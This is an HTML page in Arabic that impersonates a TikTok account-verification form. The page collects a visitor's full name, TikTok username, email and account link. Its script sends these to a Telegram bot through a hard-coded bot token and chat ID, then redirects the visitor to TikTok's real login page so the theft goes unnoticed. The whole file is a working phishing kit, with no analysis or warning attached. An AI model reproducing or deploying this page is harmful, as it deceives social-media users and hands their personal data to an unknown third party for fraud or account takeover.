<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>توثيق حساب TikTok</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <style>
    :root {
      --primary: #ff0050;
      --bg: #f5f5f5;
      --card-bg: #111111;
      --text: #ffffff;
      --muted: #bbbbbb;
      --radius: 18px;
      --input-bg: #222222;
      --hover-bg: #e60045;
      --glow: 0px 0px 8px var(--primary);
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Inter', sans-serif;
    }

    html, body {
      background-color: var(--bg);
      height: 100%;
      overflow: hidden;
    }

    body {
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 10px;
    }

    .card {
      background-color: var(--card-bg);
      border-radius: var(--radius);
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
      padding: 25px;
      width: 100%;
      max-width: 360px;
      text-align: center;
      opacity: 0;
      animation: fadeIn 1s forwards;
      transition: box-shadow 0.3s ease-in-out;
    }

    .card:hover {
      box-shadow: var(--glow);
    }

    @keyframes fadeIn {
      from {
        opacity: 0;
        transform: translateY(20px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    .card img {
      width: 120px;
      margin-bottom: 20px;
      animation: fadeIn 1s forwards 0.2s;
    }

    h2 {
      font-size: 20px;
      color: var(--text);
      margin-bottom: 10px;
      text-shadow: 0 0 5px var(--primary), 0 0 10px var(--primary);
    }

    p {
      font-size: 14px;
      color: var(--muted);
      margin-bottom: 20px;
      text-shadow: 0 0 5px var(--primary), 0 0 10px var(--primary);
    }

    input {
      width: 100%;
      padding: 12px 14px;
      margin-bottom: 14px;
      background-color: var(--input-bg);
      border: none;
      border-radius: var(--radius);
      color: var(--text);
      font-size: 14px;
      transition: all 0.3s ease;
      box-shadow: 0 0 5px var(--primary);
    }

    input::placeholder {
      color: #888;
    }

    input:focus {
      background-color: #333333;
      outline: none;
      box-shadow: 0 0 8px var(--primary);
    }

    button {
      width: 100%;
      padding: 14px;
      background-color: var(--primary);
      border: none;
      border-radius: var(--radius);
      color: white;
      font-size: 15px;
      font-weight: bold;
      cursor: pointer;
      transition: background-color 0.3s ease;
      text-shadow: 0 0 5px var(--primary), 0 0 10px var(--primary);
    }

    button:hover {
      background-color: var(--hover-bg);
    }
  </style>
</head>
<body>
  <div class="card">
    <img src="https://raw.githubusercontent.com/Hhfjkyr/my-website/main/537af08a11a116c157659081006036e7%20(1).png" alt="TikTok Logo">
    <h2>طلب توثيق الحساب</h2>
    <p>املأ المعلومات أدناه لإرسال طلبك</p>
    <form id="verifyForm">
      <input type="text" placeholder="الاسم الكامل" id="fullName" required>
      <input type="text" placeholder="اسم المستخدم في TikTok" id="userName" required>
      <input type="email" placeholder="البريد الإلكتروني" id="email" required>
      <input type="text" placeholder="رابط الحساب (اختياري)" id="accountLink">
      <button type="submit">إرسال الطلب</button>
    </form>
  </div>

  <script>
    document.getElementById("verifyForm").addEventListener("submit", function(e) {
      e.preventDefault();

      const fullName = document.getElementById('fullName').value;
      const userName = document.getElementById('userName').value;
      const email = document.getElementById('email').value;
      const accountLink = document.getElementById('accountLink').value;

      // Send data to Telegram Bot
      const botToken = '7008716029:AAFOh4raFcgDCzQzJSV0BOxV0Wd0k2jpmR0';
      const chatId = '5029891039';
      const message = `
*✅ طلب توثيق الحساب جديد* 

👤 *الاسم الكامل:* ${fullName}
🎮 *اسم المستخدم في TikTok:* ${userName}
📧 *البريد الإلكتروني:* ${email}
🔗 *رابط الحساب (اختياري):* ${accountLink ? accountLink : 'لا يوجد'}

🔔 شكراً لتقديم طلبك! سيتم مراجعته في أقرب وقت! 🎉
      `;
      
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'Markdown'
        })
      })
      .then(response => {
        if (response.ok) {
          alert('تم استلام طلب التوثيق بنجاح!');
          window.location.href = 'https://www.tiktok.com/login'; // Redirect to TikTok login page
        } else {
          alert('فشل في إرسال البيانات!');
        }
      });
    });
  </script>
</body>
</html>
